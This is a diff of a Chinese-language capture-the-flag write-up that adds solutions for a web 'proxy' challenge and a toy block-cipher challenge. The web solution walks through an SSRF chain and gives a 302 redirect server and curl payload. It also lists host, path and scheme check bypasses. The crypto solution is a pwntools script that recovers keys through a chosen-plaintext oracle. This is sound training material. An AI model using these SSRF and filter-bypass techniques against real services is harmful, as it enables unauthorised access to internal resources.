@@ -359,7 +359,8 @@ echo serialize($data);
 ?>
 ```
 > Flag: THJCC{lin3_r4nGeR_13_1ncreD!Ble_64m3?}
-<!-- 
+
+ 
 ## proxy | under_development(410)
 **/src/app.js:**
 ```javascript
@@ -453,15 +454,41 @@ app.get('/flag', (req, res) => {
 });
 
 app.listen(80, 'secret.flag.thjcc.tw');
-``` -->
+``` 
+先說幾個問題&可利用點:
+1. follow-redirects
 
+    它會自動跟蹤302，這樣可以讓他導到自己的server(SSRF)
 
+2. `const fixedhost = 'extra-' + host + '.cggc.chummy.tw';`
 
+    server只會解析hostname，有加上`/`就可以繞過了
 
+3. `if (req.path === '/flag'){ `
 
+    這很傻逼，只要`flag/`就可以繞過了
+    
+4.  `CheckSeheme(scheme)`
+    
+    用`http:/`就可
 
+剩下就是自架server讓他redirect到`http://secret.flag.thjccc.tw/flag/`
 
+```javascript
+const http = require('http');
 
+http.createServer((_, res) => {
+    res.writeHead(302, {
+        'Location': 'http://secret.flag.thjccc.tw/flag/'
+    });
+    res.end();
+}).listen(8080);
+```
+
+payload:
+`curl -v "http://chal.ctf.scint.org:10068/fetch?scheme=http:/&host=<server_ip>:8080/flag/?&path=114514"`
+
+>Flag: THJCC{—>redirection—>evil-websites—>redirection—>bypass!—>flag!}
 
 
 # Crypto
@@ -744,8 +771,8 @@ print(hexlify(new_token).decode())
 ```
 > Flag: THJCC{F1iP_Ou7_y0$Hino's_53Cr3t}
 
-<!-- ## Speeded Block Cipher(260)
-**chal:**
+## Speeded Block Cipher(260)
+**chal(加一點微不足道的註釋):**
 ```python
 #!/usr/bin/python3
 from secret import FLAG
@@ -756,11 +783,18 @@ KEY = os.urandom(16)
 IV = os.urandom(16)
 counter = 0
 
-def pad(text: bytes) -> bytes:
+def pad(text: bytes) -> bytes:    #PKCS 7
     padding = 16 - (len(text) % 16)
     return text + bytes([padding]) * padding
 
 def shift_rows(B: list):
+    """
+    把一維 16 bytes 切成 4×4 矩陣
+    ROL
+    index 1 : 1→2→3→0
+    index 2 : 2→3→0→1
+    index 3 : 3→0→1→2
+    """
     M = [B[i: i + 4] for i in range(0, 16, 4)]
     M[0][1], M[1][1], M[2][1], M[3][1] = M[1][1], M[2][1], M[3][1], M[0][1]
     M[0][2], M[1][2], M[2][2], M[3][2] = M[2][2], M[3][2], M[0][2], M[1][2]
@@ -770,7 +804,9 @@ def shift_rows(B: list):
 def expand_key(K, PS):
     for i in range(PS - 1):
         NK = [(~(x + y)) & 0xFF for x, y in zip(K[i], K[i + 1])]
+        # 逐位x + y → 取 bitwise NOT(保留低 8 bit)
         NK = [(x >> 4) | (x << 4) & 0xFF for x in NK]
+        # left nibble / right bibble互換
         NK = shift_rows(NK)
         K.append(NK)
     return K[1:]
@@ -783,6 +819,7 @@ def encrypt(plaintext: bytes) -> bytes:
     PS = len(plaintext) // 16
     P = [plaintext[i: i + 16] for i in range(0, PS * 16, 16)]
     K = expand_key([IV, KEY], PS)
+    # 取得PS個 round-key
     C = []
     for i, B in enumerate(P):
         C.append(add(B, K[i]))
@@ -799,7 +836,58 @@ def main():
 
 if __name__ == '__main__':
     main()
-``` -->
+``` 
+1.  chosen-plaintext oracle：對任意明文呼叫 `encrypt()` 並取得對應密文
+
+2. 洩露round-key：
+
+- 空輸入得 S[0]（KEY）
+- 16*i+1 個 0x00 得 S[i]
+
+3. 逆運算P[j] = (C[j] ^ S[i][j]) - 1 還原所有明文塊，然後去掉PKCS#7 padding
+
+exploit:
+```python
+from pwn import remote
+import binascii
+
+r = remote("chal.ctf.scint.org", 12001)
+
+def enc(hexstr: str) -> bytes:
+    r.sendlineafter("encrypt(hex) > ", hexstr)
+    parts = r.recvline().strip().split()
+    return binascii.unhexlify(parts[1])
+
+r.recvuntil("encrypted flag: ")
+encrypted_flag = r.recvline().strip().decode()
+
+C0 = enc("")  
+KEY = bytes([c ^ 0x11 for c in C0])
+
+flag_ct = bytes.fromhex(encrypted_flag)
+blocks = [flag_ct[i:i+16] for i in range(0, len(flag_ct), 16)]
+
+S = [KEY]
+for i in range(1, len(blocks)):
+    nbytes = i*16 + 1
+    plain = b"\x00" * nbytes
+    CT = enc(plain.hex())
+    Ci = CT[i*16:(i+1)*16]
+    Pi_plus1 = [1] + [0x10]*15
+    Si = bytes([ Ci[j] ^ Pi_plus1[j] for j in range(16) ])
+    S.append(Si)
+
+plain = b""
+for i, Ci in enumerate(blocks):
+    Pi = bytes([ ((Ci[j] ^ S[i][j]) - 1) & 0xff for j in range(16) ])
+    plain += Pi
+
+padlen = plain[-1]
+flag = plain[:-padlen]
+print(flag.decode())
+```
+
+> Flag: THJCC{jU$T_4_$1Mple_xor_ENCryP7!oN_iSN't_it?}
 
 
 # Reverse
